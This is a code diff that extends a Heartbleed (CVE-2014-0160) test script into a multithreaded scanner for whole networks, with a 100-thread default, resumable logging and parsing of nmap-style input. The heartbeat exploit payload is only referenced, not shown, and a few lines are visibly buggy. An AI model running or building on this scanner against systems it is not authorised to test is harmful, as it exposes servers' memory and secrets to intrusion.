@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python
 
 # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
 # The author disclaims copyright to this source code.
@@ -17,12 +17,16 @@ import re
 from optparse import OptionParser
 import netaddr
 from collections import defaultdict
+from multiprocessing.dummy import Pool
 
 options = OptionParser(usage='%prog <network> [network2] [network3] ...', description='Test for SSL heartbleed vulnerability (CVE-2014-0160) on multiple domains')
 options.add_option('--input', '-i', dest="input_file", default=[], action="append", help="Optional input file of networks or ip addresses, one address per line")
-options.add_option('--logfile', '-o', dest="log_file", default=None, help="Optional logfile destination")
-options.add_option('--resume', dest="resume", default=False, help="Do not rescan hosts that are already in the logfile")
+options.add_option('--logfile', '-o', dest="log_file", default="results.txt", help="Optional logfile destination")
+options.add_option('--resume', dest="resume", action="store_true", default=False, help="Do not rescan hosts that are already in the logfile")
 options.add_option('--timeout', '-t', dest="timeout", default=2, help="How long to wait for remote host to respond before timing out")
+options.add_option('--threads', dest="threads", default=100, help="If specific, run X concurrent threads")
+opts, args = options.parse_args()
+
 
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
@@ -148,21 +152,79 @@ def is_vulnerable(host, timeout):
     s.send(hb)
     return hit_hb(s)
 
+hosts_to_skip = []
+counter = defaultdict(int)
+import threading
+lock = threading.Lock()
+
+
+def store_results(host, status):
+    current_time = time.time()
+    with lock:
+        counter[status] += 1
+        with open(opts.log_file, 'a') as f:
+            message = "{current_time} {host} {status}".format(**locals())
+            f.write(message + "\n")
+            return message
+
+
+def scan_host(host):
+    """ Scans a single host, logs into
+
+    Returns:
+        list(timestamp, ipaddress, vulnerabilitystatus)
+    """
+    host = str(host)
+    if host in hosts_to_skip:
+        return
+    result = is_vulnerable(host, opts.timeout)
+    message = store_results(host, result)
+    print message
+
+
+def scan_hostlist(hostlist, threads=5):
+    """ Iterates through hostlist and scans them
+
+    Arguments:
+        hostlist    -- Iterable with ip addresses
+        threads     -- If specified, run in multithreading mode
+    """
+    threads = int(threads)
+    p = Pool(processes=threads)
+    p.map(scan_host, hostlist)
+
+
+def clean_hostlist(args):
+    """ Returns list of iterables
+    Examples:
+    >>> hostlist = ["127.0.0.1", "127.0.0.2"]
+    >>> clean_hostlist(hostlist)
+    """
+    hosts = []
+    networks = []
+    for i in args:
+        # If arg contains a / we assume its a network name
+        if '/' in i:
+            networks.append(netaddr.IPNetwork(i))
+        # If it contains any alphanumerics, it might be a domain name
+        elif any(c.isalpha() for c in i):
+            hosts.append(socket.gethostbyname(i))
+        else:
+            hosts.append(i)
+    result = []
+    for i in networks:
+        result.append(i)
+    if hosts:
+        result.append(hosts)
+    return result
+
 
 def main():
-    counter = defaultdict(int)
-    logfile = None
-    hosts_to_skip = []
-
-    opts, args = options.parse_args()
-
     if not args and not opts.input_file:
         options.print_help()
         return
 
-    if opts.log_file:
-        logfile = open(opts.log_file, 'a')
-
+    # If --resuem specified, find a list of hosts that we will skip
     if opts.resume:
         if not opts.log_file:
             options.error("You need to provide -l with --resume")
@@ -171,43 +233,34 @@ def main():
             for line in f:
                 tmp = line.split()
                 host = tmp[1]
-                if len(tmp) != 3 and host not in hosts_to_skip:
+                if len(tmp) != 3:
                     continue
-                hosts_to_skip.append(host)
+                if host not in hosts_to_skip:
+                    hosts_to_skip.append(host)
         print "Skipping %s hosts" % (len(hosts_to_skip), )
 
 
     # If any input files were provided, parse through them and add all addresses to "args"
     for input_file in opts.input_file:
         with open(input_file) as f:
+            hostlist = []
             for line in f:
                 words = line.split()
                 if not words:
                     continue
                 if line.startswith("Discovered open port"):
-                    args.append(words.pop())
+                    hostlist.append(words.pop())
                 elif len(words) == 1:
-                    args.append(words[0])
+                    hostlist.append(words[0])
                 else:
                     print "Skipping invalid input line: " % line
                     continue
+            args.append(hostlist)
 
     # For every network in args, convert it to a netaddr network, so we can iterate through each host
-    remote_networks = map(lambda x: netaddr.IPNetwork(x), args)
-
+    remote_networks = clean_hostlist(args)
     for network in remote_networks:
-        for host in network:
-            host = str(host)
-            if host in hosts_to_skip:
-                continue
-            result = is_vulnerable(host, opts.timeout)
-            counter[result] += 1
-            current_time = time.time()
-            message = "{current_time} {host} {result}".format(**locals())
-            print message
-            if logfile:
-                logfile.write(message + "\n")
-                logfile.flush()
+        scan_hostlist(network, threads=opts.threads)
 
 
     print "No SSL: " + str(counter[None])
